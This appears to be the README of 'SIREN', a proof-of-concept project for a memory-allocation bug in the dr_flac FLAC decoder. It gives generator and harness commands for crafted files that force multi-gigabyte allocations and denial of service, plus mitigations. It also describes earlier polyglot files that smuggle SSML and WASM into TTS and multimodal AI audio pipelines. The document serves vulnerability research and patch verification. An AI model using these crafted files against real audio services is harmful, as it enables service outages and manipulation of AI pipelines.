# SIREN

**Container-confusion polyglots targeting TTS and multimodal AI audio pipelines.**
Proof-of-concept security research by frankSx — test only on systems you own or have explicit permission to test.

---

## Current Release: v3.0 (2026-09-23)

**Precise weaponization of CVE-2026-32836** — uncontrolled memory allocation in mackron/dr_libs `dr_flac.h` ≤ 0.13.3.

### The bug

In `drflac__read_and_decode_metadata()`, the PICTURE metadata case allocates from attacker-controlled length fields *before* bounds-checking them:

```c
// dr_flac.h:6748 — read attacker-controlled BE uint32
metadata.data.picture.mimeLength = drflac__be2host_32(...);

// dr_flac.h:6750 — ALLOCATION FIRST  <-- the bug
pMime = malloc(metadata.data.picture.mimeLength + 1);

// dr_flac.h:6756 — bounds check AFTER (too late)
if (blockSizeRemaining < metadata.data.picture.mimeLength || ...)
```

The same ordering mistake repeats at line 6772 for `descriptionLength`. A 78-byte file forces `malloc(0xFFFFFFFF)` — ~4 GiB per field. Reachable **only** via `drflac_open_*_with_metadata()` with a non-NULL callback (dr_flac.h:6728) — exactly the cover-art / thumbnail / multimodal-ingest path.

| | |
|---|---|
| CWE | CWE-789 (Memory Allocation with Excessive Size Value) |
| CVSS 4.0 | 6.9 — `AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H` |
| Fixed | commits `fefced4`, `4f5a4cd`, `663239a` |
| Credit | Ana Kapulica (libFuzzer) |
| References | [dr_libs issue #298](https://github.com/mackron/dr_libs/issues/298) · VulnCheck advisory |

### PoC contents (`v3/`)

| File | Purpose |
|---|---|
| `siren_v3_generator.py` | Regenerates both PoC files; tunable `--mime-length` / `--desc-length` |
| `siren_v3_harness.c` | Vulnerable-target simulator (metadata-callback ingest + ASan malloc hook) |
| `SIREN_v3_DOCUMENTATION.md` | Full technical writeup: root cause, gate conditions, abuse model, outcomes |
| `SIREN_v3_MANIFEST.txt` | Spec sheet |
| `blog_post_cve_2026_32836.md` | Blog writeup |

### Usage

```bash
# Generate the PoC files
python3 v3/siren_v3_generator.py --mode both
#  -> siren_v3_cve-2026-32836_minimal_78B.flac  (78 bytes, ~4 GiB alloc)
#  -> siren_v3.0.polyglot.flac                 (372 bytes, dual-stage ~8 GiB + SSML carrier)

# Build the harness against a vendored dr_flac.h
clang -fsanitize=address -O1 -g -o siren_harness v3/siren_v3_harness.c
./siren_harness siren_v3_cve-2026-32836_minimal_78B.flac
```

### Expected outcomes

| Build | Result |
|---|---|
| dr_flac ≤ 0.13.3 + ASan | Abort at `dr_flac.h:6750`, `malloc(4294967295)`, symbolized stack |
| dr_flac ≤ 0.13.3 production | 4–8 GiB RSS spike per request → OOM-kill → service DoS |
| Patched (663239a+) | Bounds check fires first → `open` returns NULL, zero allocation |

**Edge case:** `mimeLength = 0xFFFFFFFF` wraps `+1` to 0 (`malloc(0)`). Use `0xFFFFFFFE`.

### Mitigation

- Upgrade dr_libs past commit `663239a`.
- Cap ingest workers (cgroup `memory.max`, `ulimit -v`, K8s memory limits).
- Alert on >1 GiB RSS spikes in audio-ingest services.
- Audit binaries for vendored dr_libs (`drflac__read_and_decode_metadata`) — single-header vendoring is invisible to dependency scanners.

---

## Correction of Record

v2.0 modeled CVE-2026-32836 as *"PADDING blocks with fake nested headers causing O(n²) recursive parsing"* — based on the pre-disclosure summary, and **wrong**. The actual bug is the single unchecked malloc in PICTURE parsing described above. The v2 PoC does not exercise the real vulnerability. v3.0 supersedes it.

---

## Prior Releases

### v2.0 (2026-03-25) — Multi-format polyglot

FLAC/MP3/OGG simultaneous identity, adaptive SSML with provider probing (Google/AWS/Azure/OpenAI), nested OGG-in-FLAC container, ultrasonic 20–22 kHz carrier. Files: `siren_v2.0.flac`, `siren_v2_extractor.py`, `SIREN_v2_DOCUMENTATION.md`, `SIREN_v2_MANIFEST.txt`.

### v1.0 (2026-03-24) — First TTS-audio container polyglot

FLAC + SSML-in-Vorbis-comment + WASM-in-PADDING. First demonstrated parser differential between audio decoders and TTS pipelines. Files in `v1/`.

---

## Timeline

| Date | Milestone |
|---|---|
| 2026-03-24 | v1.0 — FLAC + SSML + WASM polyglot |
| 2026-03-25 | v2.0 — multi-format + probing + ultrasonic |
| 2026-09-23 | v3.0 — CVE-2026-32836 correction + precise PICTURE malloc PoC |

## Legal

Proof-of-concept for authorized security research and defensive patch verification only. Not for malicious use.
